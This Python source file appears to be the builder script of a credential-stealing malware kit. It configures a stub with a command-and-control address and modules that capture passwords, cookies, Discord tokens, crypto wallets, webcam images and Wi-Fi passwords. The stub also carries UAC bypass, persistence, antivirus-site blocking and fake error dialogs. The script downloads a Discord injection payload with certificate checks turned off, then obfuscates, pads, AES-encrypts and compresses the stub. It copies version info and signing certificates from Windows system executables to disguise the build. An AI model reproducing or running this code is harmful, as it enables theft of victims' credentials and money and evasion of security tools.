import json
import base64
import os
import subprocess
import random
import string
import py_compile
import zlib
import pyaes
import zipfile

from urllib3 import PoolManager, disable_warnings
disable_warnings()
import BlankOBF as obfuscator
from sigthief import outputCert

SettingsFile = "config.json"
InCodeFile = "stub.py"
OutCodeFile = "stub-o.py"
InjectionURL = "https://raw.githubusercontent.com/Blank-c/Discord-Injection-BG/main/injection-obfuscated.js"

def WriteSettings(code: str, settings: dict, injection: str) -> str:
    code = code.replace('__name__ == "__main__" and ', '')
    code = code.replace('"%c2%"', "(%d, %s)" % (settings["settings"]["c2"][0], EncryptString(settings["settings"]["c2"][1])))
    code = code.replace('"%mutex%"', EncryptString(settings["settings"]["mutex"]))
    code = code.replace('"%archivepassword%"', EncryptString(settings["settings"]["archivePassword"]))
    code = code.replace('%pingme%', "true" if settings["settings"]["pingme"] else "")
    code = code.replace('%vmprotect%', "true" if settings["settings"]["vmprotect"] else "")
    code = code.replace('%startup%', "true" if settings["settings"]["startup"] else "")
    code = code.replace('%melt%', "true" if settings["settings"]["melt"] else "")
    code = code.replace('%uacBypass%', "true" if settings["settings"]["uacBypass"] else "")
    code = code.replace('%hideconsole%', "true" if settings["settings"]["consoleMode"] in (0, 1) else "")
    code = code.replace('%debug%', "true" if settings["settings"]["debug"] else "")
    code = code.replace('%boundfilerunonstartup%', "true" if settings["settings"]["boundFileRunOnStartup"] else "")
    
    code = code.replace('%capturewebcam%', "true" if settings["modules"]["captureWebcam"] else "")
    code = code.replace('%capturepasswords%', "true" if settings["modules"]["capturePasswords"] else "")
    code = code.replace('%capturecookies%', "true" if settings["modules"]["captureCookies"] else "")
    code = code.replace('%capturehistory%', "true" if settings["modules"]["captureHistory"] else "")
    code = code.replace('%captureautofills%', "true" if settings["modules"]["captureAutofills"] else "")
    code = code.replace('%capturediscordtokens%', "true" if settings["modules"]["captureDiscordTokens"] else "")
    code = code.replace('%capturegames%', "true" if settings["modules"]["captureGames"] else "")
    code = code.replace('%capturewifipasswords%', "true" if settings["modules"]["captureWifiPasswords"] else "")
    code = code.replace('%capturesysteminfo%', "true" if settings["modules"]["captureSystemInfo"] else "")
    code = code.replace('%capturescreenshot%', "true" if settings["modules"]["captureScreenshot"] else "")
    code = code.replace('%capturetelegram%', "true" if settings["modules"]["captureTelegramSession"] else "")
    code = code.replace('%capturecommonfiles%', "true" if settings["modules"]["captureCommonFiles"] else "")
    code = code.replace('%capturewallets%', "true" if settings["modules"]["captureWallets"] else "")

    code = code.replace('%fakeerror%', "true" if settings["modules"]["fakeError"][0] else "")
    code = code.replace("%title%", settings["modules"]["fakeError"][1][0])
    code = code.replace("%message%", settings["modules"]["fakeError"][1][1])
    code = code.replace("%icon%", str(settings["modules"]["fakeError"][1][2]))

    code = code.replace('%blockavsites%', "true" if settings["modules"]["blockAvSites"] else "")
    code = code.replace('%discordinjection%', "true" if settings["modules"]["discordInjection"] else "")

    if injection is not None:
        code = code.replace("%injectionbase64encoded%", base64.b64encode(injection.encode()).decode())
    
    return code

def PrepareEnvironment(settings: dict) -> None:
    if os.path.isfile("bound.exe"):
        with open("bound.exe", "rb") as file:
            content = file.read()
        
        encrypted = zlib.compress(content)[::-1]

        with open("bound.blank", "wb") as file:
            file.write(encrypted)
        
    elif os.path.isfile("bound.blank"):
        os.remove("bound.blank")

    if settings["settings"]["consoleMode"] == 0:
        open("noconsole", "w").close()
    else:
        if os.path.isfile("noconsole"):
            os.remove("noconsole")
    
    pumpedStubSize = settings["settings"]["pumpedStubSize"]
    if pumpedStubSize > 0:
        with open("pumpStub", "w") as file:
            file.write(str(pumpedStubSize))
    elif os.path.isfile("pumpStub"):
        os.remove("pumpStub")

def ReadSettings() -> tuple[dict, str]:

    settings, injection = dict(), str()
    if os.path.isfile(SettingsFile):
        with open(SettingsFile) as file:
            settings = json.load(file)

    try:
        http = PoolManager(cert_reqs="CERT_NONE")
        injection = http.request("GET", InjectionURL, timeout= 5).data.decode().strip()
        if not "discord.com" in injection:
            injection = None
    except Exception:
        injection = None
    
    return (settings, injection)

def EncryptString(plainText: str) -> str:
    encoded = base64.b64encode(plainText.encode()).decode()
    return "base64.b64decode(\"{}\").decode()".format(encoded)

def junk(path: str) -> None:
    with open(path) as file:
        code = file.read()
    generate_name = lambda: "_%s" % "".join(random.choices(string.ascii_letters + string.digits, k = random.randint(8, 20)))
    junk_funcs = [generate_name() for _ in range(random.randint(25, 40))]
    junk_func_calls = junk_funcs.copy()
    
    junk_code = """
class %s:
    def __init__(self):
    """.strip() % generate_name()

    junk_code += "".join(["\n%sself.%s(%s)" % (" " * 8, x, ", ".join(["%s()" %generate_name() for _ in range(random.randint(1, 4))])) for x in junk_funcs])

    random.shuffle(junk_funcs)
    random.shuffle(junk_func_calls)

    junk_code += "".join(["\n%sdef %s(self, %s):\n%sself.%s()" % (" " * 4, junk_funcs[index], ", ".join([generate_name() for _ in range(random.randint(5, 20))]), " " * 8, junk_func_calls[index]) for index in range(len(junk_func_calls))])

    with open(path, "w") as file:
        file.write(code + "\n" + junk_code)

def MakeVersionFileAndCert() -> None:
    original: str
    retries = 0
    exeFiles = []
    paths = [
        os.getenv("SystemRoot"),
        os.path.join(os.getenv("SystemRoot"), "System32"),
        os.path.join(os.getenv("SystemRoot"), "sysWOW64")
    ]

    with open("version.txt") as exefile:
        original = exefile.read()

    for path in paths:
        if os.path.isdir(path):
            exeFiles += [os.path.join(path, x) for x in os.listdir(path) if (x.endswith(".exe") and not x in exeFiles)]

    if exeFiles:
        while(retries < 5):
            exefile = random.choice(exeFiles)
            res = subprocess.run('pyi-grab_version "{}" version.txt'.format(exefile), shell= True, capture_output= True)
            if res.returncode != 0:
                retries += 1
            else:
                with open("version.txt") as file:
                    content = file.read()
                if any([(x.count("'") % 2 == 1 and not x.strip().startswith("#")) for x in content.splitlines()]):
                    retries += 1
                    continue
                else:
                    outputCert(exefile, "cert")
                    break

        if retries >= 5:
            with open("version.txt", "w") as exefile:
                exefile.write(original)

def main() -> None:
    with open(InCodeFile) as file:
        code = file.read()

    code = WriteSettings(code, *ReadSettings())
    PrepareEnvironment(ReadSettings()[0])

    obfuscator.BlankOBF(code, OutCodeFile)
    junk(OutCodeFile)

    compiledFile = "stub-o.pyc"
    zipFile = "blank.aes"
    py_compile.compile(OutCodeFile, compiledFile)
    os.remove(OutCodeFile)
    with zipfile.ZipFile(zipFile, "w") as zip:
        zip.write(compiledFile)
    os.remove(compiledFile)

    key = os.urandom(32)
    iv = os.urandom(12)

    encrypted = pyaes.AESModeOfOperationGCM(key, iv).encrypt(open(zipFile, "rb").read())
    encrypted = zlib.compress(encrypted)[::-1]
    open(zipFile, "wb").write(encrypted)
    
    with open("loader.py", "r") as file:
        loader = file.read()

    loader = loader.replace("%key%", base64.b64encode(key).decode())
    loader = loader.replace("%iv%", base64.b64encode(iv).decode())

    with open("loader-o.py", "w") as file:
        file.write(loader)

    MakeVersionFileAndCert()

if __name__ == "__main__":
    main()